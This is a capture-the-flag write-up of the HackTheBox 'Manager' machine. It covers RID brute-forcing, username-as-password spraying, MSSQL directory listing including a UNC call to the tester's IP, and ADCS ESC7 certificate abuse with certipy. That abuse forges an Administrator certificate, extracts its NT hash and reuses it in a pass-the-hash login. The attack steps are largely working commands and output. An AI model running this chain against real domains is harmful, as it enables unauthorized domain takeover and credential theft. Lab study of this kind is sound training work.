---
title: "HackTheBox - Manager"
author: DrLi
description: "Writeup of a medium-rated Windows Active Directory machine from HackTheBox involving MSSQL access and Active Directory Certificate Services privilege escalation."
date: 2025-11-19 15:00:00 +0000
categories: [HackTheBox, Machines]
tags: [hackthebox, windows, medium, active directory, smb, mssql, rid-brute, winrm, powershell, adcs, esc7, certificate abuse, certipy]
img_path: /assets/img/HackTheBox/Machines/Manager
image:
    path: /assets/img/HackTheBox/Machines/Manager/manager.png
---

<div align="center"><script src="https://tryhackme.com/badge/2794771"></script></div>

---

[Manager](https://www.hackthebox.com/machines/manager) from [HackTheBox](https://www.hackthebox.com/) is a medium Windows Active Directory machine that begins with enumeration via RID cycling and password spraying. Valid credentials for the user "operator" allow authentication to MSSQL, where filesystem enumeration reveals a backup of the web directory. Extracting credentials from this backup, we access the machine via WinRM as the user "raven." Leveraging an ADCS ESC7 vulnerability due to dangerous permissions, we enable a certificate template and request a rogue SubCA certificate for the Administrator account, ultimately leading to full domain compromise.


### Enumeration

## nmap

```bash
Nmap scan report for 10.129.8.19
Host is up (0.087s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-19 22:06:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-11-19T22:08:09+00:00; +6h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-11-19T22:08:09+00:00; +7h00m00s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.8.19:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.8.19:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-11-19T22:08:09+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-19T22:01:27
|_Not valid after:  2055-11-19T22:01:27
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-19T22:08:09+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2025-11-19T22:08:09+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49728/tcp open  msrpc         Microsoft Windows RPC
49738/tcp open  tcpwrapped
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-19T22:07:28
|_  start_date: N/A
```

we can see that port 80 is open 

![image.png](/assets/img/HackTheBox/Machines/Manager/image.png)

after investigating the website it looks like just a static website nothing useful 

so we move to enumerate for any Guest or null sessions on other services

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ nxc smb manager.htb -u 'a' -p ''         
SMB         10.129.8.19     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.19     445    DC01             [+] manager.htb\a: (Guest)
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ nxc smb manager.htb -u 'a' -p '' --shares
SMB         10.129.8.19     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.19     445    DC01             [+] manager.htb\a: (Guest)
SMB         10.129.8.19     445    DC01             [*] Enumerated shares
SMB         10.129.8.19     445    DC01             Share           Permissions     Remark
SMB         10.129.8.19     445    DC01             -----           -----------     ------
SMB         10.129.8.19     445    DC01             ADMIN$                          Remote Admin
SMB         10.129.8.19     445    DC01             C$                              Default share
SMB         10.129.8.19     445    DC01             IPC$            READ            Remote IPC
SMB         10.129.8.19     445    DC01             NETLOGON                        Logon server share 
SMB         10.129.8.19     445    DC01             SYSVOL                          Logon server share 
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ nxc smb manager.htb -u 'a' -p '' --users 
SMB         10.129.8.19     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.19     445    DC01             [+] manager.htb\a: (Guest)
```

as guest we can enumerate shares but not users 

we can try the rid-brute flag with netexec to enumerate for AD objects

rid-brute just generally takes the domain SID and goes to the last bash and bruteforces for valid ones

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ nxc smb manager.htb -u 'a' -p '' --rid-brute
SMB         10.129.8.19     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.8.19     445    DC01             [+] manager.htb\a: (Guest)
SMB         10.129.8.19     445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                                                 
SMB         10.129.8.19     445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.129.8.19     445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.129.8.19     445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.129.8.19     445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.129.8.19     445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.129.8.19     445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.129.8.19     445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.129.8.19     445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.129.8.19     445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.129.8.19     445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.129.8.19     445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.129.8.19     445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.8.19     445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.8.19     445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.8.19     445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.129.8.19     445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.129.8.19     445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.8.19     445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.8.19     445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                                                 
SMB         10.129.8.19     445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)                                                                                                                  
SMB         10.129.8.19     445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.129.8.19     445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.129.8.19     445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.8.19     445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.129.8.19     445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.129.8.19     445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.129.8.19     445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.129.8.19     445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.129.8.19     445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.129.8.19     445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.129.8.19     445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

we have some users 

let’s try the username as password for all of them and see if any will work

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ nxc smb manager.htb -u users.txt -p users.txt --no-brute
SMB         10.129.8.19     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) 
SMB         10.129.8.19     445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE 
SMB         10.129.8.19     445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.129.8.19     445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.129.8.19     445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.129.8.19     445    DC01             [-] manager.htb\jinWoo:jinWoo STATUS_LOGON_FAILURE 
SMB         10.129.8.19     445    DC01             [-] manager.htb\chinHae:chinHae STATUS_LOGON_FAILURE 
SMB         10.129.8.19     445    DC01             [+] manager.htb\operator:operator 
```

and one worked so we now have valid credentials

let’s see what we can do with them

BTW in the nmap scan we found MSSQL port open we can try to see if we can connect

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ nxc mssql manager.htb -u 'operator' -p 'operator' 
MSSQL       10.129.8.19     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.129.8.19     1433   DC01             [+] manager.htb\operator:operator 
```

so we can authenticate to MSSQL

let’s enumerate and see what we can do from it

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ impacket-mssqlclient manager.htb/operator:'operator'@10.129.8.19 -windows-auth

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> xp_dirtree //10.10.14.115/scdcsd
subdirectory   depth   file   
------------   -----   ----   
SQL (MANAGER\Operator  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query
    
SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree "C:\users";
subdirectory                                                                          depth   
-----------------------------------------------------------------------------------   -----   
Administrator                                                                             1   

All Users                                                                                 1   

....
```

after trying all the available commands the only one that gave something useful is xp_dirtree and using it we can see the files available on the DC

```bash
SQL (MANAGER\Operator  guest@master)> EXEC xp_dirtree 'C:\inetpub\wwwroot\', 1, 1
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1  
```

we can find this backup zip file in the website folder 

this file could be downloaded from the website

![image.png](/assets/img/HackTheBox/Machines/Manager/image1.png)

after unzipping we can find a config file inside we find new credentials

```bash
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<ldap-conf>
<server>
<host>dc01.manager.htb</host>
<open-port enabled="true">389</open-port>
<secure-port enabled="false">0</secure-port>
<search-base>dc=manager,dc=htb</search-base>
<server-type>microsoft</server-type>
<access-user>
</access-user>
<uid-attribute>cn</uid-attribute>
</server>
<search type="full">
</search>
</ldap-conf>
```

using revan credentials we can authenticate to winrm based on bloodhound 

![image.png](/assets/img/HackTheBox/Machines/Manager/image2.png)

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ evil-winrm -i manager.htb -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                    
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Raven\desktop> cat user.txt
cb3b7881cb6e55bf3caf2d462fb60df0
```

### Privilege Escalation

we can enumerate for ADCS stuff and see if we have any vulnerability we can abuse

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ certipy find -vulnerable -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.8.19 -stdout   
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'manager-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'manager-DC01-CA'
[*] Checking web enrollment for CA 'manager-DC01-CA' @ 'dc01.manager.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
    [+] User ACL Principals             : MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : User has dangerous permissions.
Certificate Templates                   : [!] Could not find any certificate templates
```

and YES!

we have ESC7 

using this blog here we can understand the full attack: https://www.hackingarticles.in/adcs-esc7-vulnerable-certificate-authority-access-control/

so basically the main thing is that our user “raven” has the “manageCA” permission on the CA 

this gives us the ability to enable a template that we can use to impersonate an admin user

following the attack path from the blog we can get this

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ certipy  ca -ca manager-DC01-CA -add-officer raven -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -target 10.129.8.19 -dc-ip 10.129.8.19   
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
                                                                                                                          
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ certipy ca -ca manager-DC01-CA -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -target 10.129.8.19 -enable-template SubCA -dc-ip 10.129.8.19
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
                                                                                                                          
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target 10.129.8.19 -template SubCA -upn administrator@manager.htb -dc-ip 10.129.8.19
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 24
[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
Would you like to save the private key? (y/N): y
[*] Saving private key to '24.key'
[*] Wrote private key to '24.key'
[-] Failed to request certificate
                                                                                                                          
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ certipy ca  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target 10.129.8.19 -issue-request 24 -dc-ip 10.129.8.19                           
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate request ID 24

┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target 10.129.8.19 -template SubCA  -retrieve 24 -dc-ip 10.129.8.19
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Retrieving certificate with ID 24
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '24.key'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ sudo ntpdate manager.htb; certipy auth -pfx administrator.pfx  -dc-ip 10.129.8.19
2025-11-19 21:22:47.250186 (-0500) +25198.942870 +/- 0.034637 manager.htb 10.129.8.19 s1 no-leap
CLOCK: time stepped by 25198.942870
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@manager.htb'
[*] Using principal: 'administrator@manager.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

now we can authenticate as admin

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Manager]
└─$ evil-winrm -i manager.htb -u 'administrator' -H 'ae5064c2f62317332c88629e025924ef'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                    
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls

    Directory: C:\Users\Administrator\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/19/2025   2:02 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
90a0284d560e6822569d29e227289c79
```

DONE!